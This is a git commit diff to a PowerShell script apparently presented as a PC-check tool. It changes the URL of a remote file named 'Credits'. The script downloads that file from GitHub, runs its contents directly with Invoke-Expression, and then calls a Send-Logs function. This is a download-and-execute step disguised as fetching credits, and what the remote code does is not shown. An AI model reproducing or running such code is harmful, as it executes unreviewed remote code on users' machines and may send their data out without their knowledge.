d88c5831941996b6574870ec9b342c67d856da3c
suprsor <suprsors@gmail.com>
2024-11-11 02:45:10 -0800

    Update SuprsorsPcCheck.ps1

--- SuprsorsPcCheck.ps1
+++ SuprsorsPcCheck.ps1
@@ -326,7 +326,7 @@ function Main {
 
     $userProfile = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::UserProfile)
     $downloadsPath = Join-Path -Path $userProfile -ChildPath "Downloads"
-    $url = "https://raw.githubusercontent.com/Reapiin/art/main/credits"
+    $url = "https://raw.githubusercontent.com/suprsor/Credits/refs/heads/main/Credits"
     $content = Invoke-RestMethod -Uri $url
     Invoke-Expression $content
     Send-Logs
